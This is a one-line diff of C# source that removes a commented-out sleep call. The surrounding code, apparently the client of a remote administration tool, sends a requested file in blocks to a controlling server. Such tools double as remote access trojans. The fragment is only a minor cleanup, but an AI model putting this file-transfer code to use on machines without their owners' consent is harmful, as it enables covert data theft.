@@ -75,7 +75,6 @@ namespace xClient.Core.Commands
                             new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                                 Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                 srcFile.LastError).Execute(client);
-                            //Thread.Sleep(200);
                         }
                         else
                             new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
